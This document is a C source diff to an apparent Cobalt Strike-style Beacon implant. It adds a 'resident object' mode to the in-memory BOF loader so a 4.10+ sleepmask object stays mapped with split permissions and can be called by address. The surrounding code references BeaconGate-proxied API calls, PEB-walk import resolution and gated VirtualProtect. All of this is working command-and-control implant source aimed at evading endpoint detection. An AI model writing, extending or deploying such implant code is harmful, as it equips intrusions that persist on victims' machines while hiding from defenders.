@@ -644,6 +644,30 @@ void bof_unpin(void) {
 	bof_pinned_size = 0;
 }
 
+/* A resident object - loaded once, then called by address again and again
+ * with no load in between (the 4.10+ sleepmask: every sleep and every
+ * gated call). Like a pinned BOF it keeps its block, with the split
+ * permissions, and its function table, outside the reuse cache - in a
+ * slot of its own, because the UDC2 pin is released by the next pinning
+ * load. */
+static char * bof_resident = NULL;
+static SIZE_T bof_resident_size;
+static int    bof_resident_how;
+static BOFF_FUNCTIONS * bof_resident_ftable = NULL;
+
+static void bof_release_resident(void) {
+	if (bof_resident == NULL)
+		return;
+	bof_free(bof_resident, bof_resident_how);
+	if (bof_resident_ftable != NULL) {
+		bof_free_slot_table(bof_resident_ftable);
+		free(bof_resident_ftable);
+		bof_resident_ftable = NULL;
+	}
+	bof_resident = NULL;
+	bof_resident_size = 0;
+}
+
 /* tier-2 item6: DYNAMICF import resolution must survive the boot context
  * (udc2_init loads the UDC2 BOF before http_init). Resolve the real
  * kernel32!LoadLibraryA through a PEB walk when the plain call path is
@@ -850,6 +874,10 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 #endif
 	int how = 0;
 
+	/* a resident object (conv 3) reports itself through args */
+	if (conv == 3 && (args == NULL || alen != (int)sizeof(RESIDENT_OBJECT)))
+		return FALSE;
+
 	ftable = (BOFF_FUNCTIONS *)malloc(sizeof(BOFF_FUNCTIONS));
 	if (ftable == NULL)
 		return FALSE;
@@ -1055,6 +1083,19 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 				bof_cached_size = 0;
 			}
 		}
+		if (conv == 3) {
+			/* the resident object: claimed here, so the load tail leaves it
+			 * mapped and never idle-flipped */
+			bof_release_resident();
+			bof_resident = base;
+			bof_resident_size = total;
+			bof_resident_how = how;
+			bof_resident_ftable = ftable;
+			if (bof_cached == base) {
+				bof_cached = NULL;
+				bof_cached_size = 0;
+			}
+		}
 		/* Relocs patch the extract buffers (execsrc). Copy them onto the
 		 * executable mapping before wiping the extracts. */
 		if (code.buffer) memcpy(code_dst, code.buffer, code.length);
@@ -1089,6 +1130,14 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		if (!perms_ok) {
 			spawn_log("bofload perms fail gle=", (long)GetLastError());
 			post_error_d(0x11, (int)GetLastError());
+			if (conv == 3) {
+				/* not resident after all: unclaim it, and the load tail
+				 * frees the block and the table like any other load's */
+				bof_resident = NULL;
+				bof_resident_size = 0;
+				bof_resident_ftable = NULL;
+				success = FALSE;
+			}
 		}
 		if (perms_ok)
 			if (conv == 1) {
@@ -1167,21 +1216,14 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					Sleep(t);
 				beacon_sleep_mask_set_exec(NULL, 0, 0);
 			}
-			else if (conv == 2) {
-#if defined(_M_X64)
-				/* the 4.10+ kit contract (arsenal-kit beacon.h): the object's
-				 * sleep_mask(BEACON_INFO *, FUNCTION_CALL *) decides how the
-				 * call runs - the sleep itself or a BeaconGate-proxied one
-				 * (gargle.cpp sm410_exec). The info sits in the clear on our
-				 * stack: the object masks the image, never this frame. */
-				BEACON_INFO info;
-				memset(&info, 0, sizeof(info));
-				beacon_info_fill(&info, code_dst, (DWORD)code.length, (DWORD)total);
-				spawn_log("sm410: call api=", (long)((FUNCTION_CALL *)args)->function);
-				((void (*)(BEACON_INFO *, FUNCTION_CALL *))inlinefunc)(&info, (FUNCTION_CALL *)args);
-#else
-				Sleep(args != NULL && alen >= (int)sizeof(DWORD) ? *(DWORD *)args : 0);
-#endif
+			else if (conv == 3) {
+				/* nothing runs now: the caller gets the entry point and the
+				 * block's extent, and calls into it by address (gargle.cpp) */
+				RESIDENT_OBJECT * obj = (RESIDENT_OBJECT *)args;
+				obj->entry = (void *)(code_dst + entry);
+				obj->base  = base;
+				obj->text  = (DWORD)code.length;
+				obj->total = (DWORD)total;
 			}
 			else {
 #if defined(_M_X64) && defined(BOFWIN_ENABLE)
@@ -1216,8 +1258,9 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		}
 	}
 
-	if (base == bof_pinned) {
-		/* pinned BOF (UDC2): keep the split permissions alive - its
+	if (base == bof_pinned || base == bof_resident) {
+		/* a pinned BOF (UDC2) or the resident object: keep the split
+		 * permissions alive - its
 		 * callbacks run on every later cycle from this very block */
 	}
 	else if (!setting_short(SETTING_BOF_REUSE_MEMORY)) {
@@ -1233,7 +1276,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		DWORD oldw = 0;
 		gate_VirtualProtect(base, total, PAGE_READWRITE, &oldw);
 	}
-	if (base == bof_pinned) {
+	if (base == bof_pinned || base == bof_resident) {
 		/* the pinned BOF's DYNAMICF import slots point INTO the slot
 		 * table's chunks - freeing them here turned the first post-load
 		 * proxy() call into a jump through freed heap (intermittent
